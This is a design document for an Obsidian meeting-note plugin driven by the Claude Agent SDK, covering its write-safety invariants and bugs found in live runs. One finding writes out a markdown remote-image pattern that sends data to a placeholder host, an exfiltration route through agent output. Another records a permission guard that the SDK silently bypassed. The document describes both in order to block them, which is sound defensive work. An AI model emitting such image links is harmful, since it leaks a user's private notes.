# Design and requirements

Why this exists, what was asked for, which decisions were made deliberately, and what was
learned by running the thing rather than reasoning about it. Read this before changing the
invariants in `src/note/` or `src/agent/` — several of them look like over-caution and are
not.

## Requirements as given

The brief, in the order it arrived:

- A fork of [Handy](https://github.com/cjpais/Handy) captures and transcribes **system audio
  alongside the microphone**, as two speaker-labelled lanes, and exposes the live transcript
  over a CLI flag (`handy --follow-stream`) for piping.
- Build **the first consumer of that stream**: an Obsidian AI note taker. Proving the CLI is
  useful is half the point.
- It **must use the Claude Agent SDK** to invoke a Claude Code session — not the raw Messages
  API.
- Model the behaviour on **Granola**. Existing Obsidian plugins (Claudian) as integration
  inspiration.
- Distributed separately from Handy. Developed inside the Handy tree but never committed to
  it (`.git/info/exclude`), then moved out.
- **Keep setup and install simple.** Lean on open source; do web research rather than
  inventing.
- **Follow best practices but do not over-engineer.**
- **Do not make assumptions — empirically test.**
- **Favor determinism over indeterministic process wherever possible.**

Decisions taken during planning:

| Question | Decision |
| --- | --- |
| Where does the raw transcript live? | Sidecar note, linked from the meeting note |
| How does it authenticate? | Reuse the already-logged-in `claude` CLI — no API key in vault config |
| What may the agent touch? | Read the whole vault; **write nothing** — all writes are our code |
| Scope | Capture + **auto-enhance during the meeting**, restructuring as it goes |
| Models | Streaming-capable only; no non-streaming degradation path |
| MCP | **Dropped** — direct file writing instead |
| Process | Codex (`gpt-5.6-sol`) implements; a Claude subagent reviews each increment |

## Divergence from Granola, on purpose

Granola splits audio the same way (system audio = "them", microphone = "me", falling back to
exactly those labels when platform speaker tags are unavailable) and uses the same anchoring
idea: your rough bullets steer the AI. That much is deliberately copied.

**Granola enhances once, after the meeting ends.** This enhances continuously *during* the
meeting — roughly every 180 characters of speech, plus a final vault-linking pass on stop.
That was an explicit requirement ("as the meeting evolved the notes should evolve") and it is
the reason for machinery Granola never needs: a summariser that runs once over a finished
transcript never has to retract a decision it already recorded. This one does.

Not built: chat-with-your-meetings, calendar integration, a template library, speaker
diarisation beyond me/them.

## Architecture

**Headless core, thin plugin.** Everything of consequence is a plain Node package with no
Obsidian dependency, driven by a CLI. Writes go directly to files; Obsidian picks up external
changes itself. The plugin supplies lifecycle and UI only.

Two payoffs: the whole pipeline is testable end to end without launching Obsidian, and
nothing — no MCP server, no plugin install — stands between the agent and the note.

```
handy.exe --follow-stream json     (child process, stdout NDJSON)
        |
        v
  StreamClient ──► TranscriptStore ──► sidecar note   (fs write, append)
        |
        | trigger policy
        v
  EnhanceRunner ──► Agent SDK query()  ──► fenced-JSON section array
  (stateless passes,   (NO resume)              |  (zod-validated, 1 retry)
   two tiers)                                   v
                                        BlockWriter ──► meeting note on disk, only
                                                        inside the handy:ai markers
```

## Invariants — do not weaken these

**Ownership.** The plugin only ever replaces text strictly between `<!-- handy:ai:start -->`
and `<!-- handy:ai:end -->`. User text is never touched. Marker anomalies (zero, duplicate,
nested, inverted) **fail closed** — no write at all, rather than a guess.

**The agent has no write tool.** `options.tools` never contains `Write`/`Edit`/`Bash`, which
removes them from its context entirely. The only mutation path is our code. Vault reads are
confined to the vault by a `canUseTool` guard.

**Writes are read-splice-write.** Every write re-reads from disk, locates markers in *that*
content, replaces only the block body, fsyncs a temp file, and renames over the target.
Offsets are never carried across an `await`.

**Optimistic concurrency.** The block hash observed at pass start is re-checked at write
time; a mismatch discards the agent result and re-queues rather than overwriting.

**Passes are stateless.** No `resume`, no session reuse. The note *is* the state, so per-pass
input stays bounded however long the meeting runs. An earlier design resumed one session for
the whole meeting; that grows context at least linearly while re-sending snapshots and
accumulating tool results, and prompt caching lowers unit price, not context size.

**Sections are replaced wholesale**, never patched. `[{heading, markdown}]` is the complete
desired state, which is what makes add/rename/reorder/drop fall out of one code path — and
what lets the AI retract something it said earlier.

## Findings that came from running it, not reading it

Each of these passed unit tests and typechecks before being caught by an actual run. They are
recorded because the fix is easy to undo by accident.

- **`rename` fails with `EPERM` while the note is open.** Obsidian, antivirus, and OneDrive
  all hold notes open; the vault this was built against is on OneDrive. The writer retries
  with backoff and returns a distinct retryable `note-locked` status. Without that, live
  enhancement hard-fails most of the time in a real vault.
- **A code fence inside a section broke enhancement permanently.** Extracting the fenced JSON
  by regex to the *first* closing fence truncates any section containing a code block — and
  it is sticky, because the malformed sections get fed back on the next pass. Extraction now
  scans candidates from the end and accepts the first that parses *and* validates.
- **`canUseTool` was silently bypassed.** Listing bare tool names in `allowedTools`
  auto-approves a call before the callback runs (the SDK warns
  `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED`). Path confinement was correct and inert. `allowedTools`
  must stay absent; `tools` already bounds availability.
- **Remote images were an exfiltration channel.** Obsidian fetches remote images on render,
  so `![](https://host/?d=…)` in agent output completes a read→egress loop with no write tool
  involved. External-URL images are neutralised to inline code and raw HTML escaped; local
  `![[wikilink]]` images are preserved.
- **The plugin bundle would not load.** The Agent SDK is ESM; bundled to CJS, esbuild shims
  `import.meta` as empty, so its `createRequire(import.meta.url)` threw on load. Fixed with a
  banner deriving a real file URL from `__filename`.
- **The first live test produced no notes at all.** The trigger was 600 characters; ~40s of
  ordinary speech produces ~130. The threshold is now 180 characters / 25s, and the status bar
  shows progress toward the next pass — the absence of that feedback was the actual bug.
- **A stampless stream silently produced nothing.** `session_elapsed_ms` was treated as
  required, but Handy's protocol added both timestamp fields *without* a version bump, so an
  older Handy dropped every event while the protocol check still passed.

## Known limitations

- **Unsaved-buffer race.** If the note is open in Obsidian with unsaved keystrokes, Obsidian's
  buffer wins on its next save and an AI update can be lost. The failure direction is the safe
  one — an AI update is lost, never user text — and the hash check re-queues.
- **Residual external-write window.** Between the verify-read and the rename, a foreign writer
  cannot be excluded with plain filesystem primitives. Our own processes serialise with a lock
  file.
- **The USD budget is inert under subscription auth.** `total_cost_usd` is commonly `0` via
  the logged-in `claude` CLI, so the pass-count cap is the real bound on a meeting.
- **Handy pastes into the focused app.** If Obsidian has focus while capturing, transcription
  lands in the note body as well as the sidecar. That is Handy's own behaviour, not this
  plugin's.

## Verification

`bun test` (unit), `bun run typecheck`, `bun run test:e2e` (headless end-to-end using the fake
transcript stream and agent stub). CI runs all of it offline — no Handy, vault, or credentials
required. See `README.md` for commands and `.github/workflows/` for the pipeline.
